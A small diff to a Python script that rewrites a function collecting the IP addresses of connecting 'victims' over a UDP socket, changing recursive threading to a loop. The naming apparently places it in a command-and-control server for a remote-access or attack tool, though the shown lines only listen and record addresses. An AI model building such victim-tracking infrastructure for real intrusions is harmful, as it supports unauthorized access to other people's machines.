@@ -5,10 +5,10 @@ from threading import Thread
 # read ab RDP
 
 def accept_for_new_victims(server_socket_for_new_users, victims_ip_list):
-    print('waitin for a victim')
-    ip = server_socket_for_new_users.recvfrom(1024)[1]
-    victims_ip_list.append(ip)
-    Thread(target=accept_for_new_victims, args=(server_socket_for_new_users, victims_ip_list,)).start()
+    while 1:
+        print('waitin for a victim')
+        ip = server_socket_for_new_users.recvfrom(1024)[1]
+        victims_ip_list.append(ip)
 
 
 def main():
